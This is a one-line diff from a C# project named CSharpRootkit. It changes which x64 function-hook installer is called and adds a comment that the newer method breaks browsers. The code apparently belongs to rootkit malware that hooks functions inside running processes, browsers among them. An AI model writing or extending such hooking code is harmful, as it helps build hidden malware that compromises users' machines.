@@ -264,7 +264,7 @@ namespace CSharpRootkit
         {
             if (Environment.Is64BitProcess)
             {
-                return Marshal.GetDelegateForFunctionPointer<T>(InstallNewAbsoluteHookX64());
+                return Marshal.GetDelegateForFunctionPointer<T>(InstallAbsoluteHookX64());//the "new" method fucks up browsers for some reason, using my old method fixs it for some reason.
             }
             else
             {
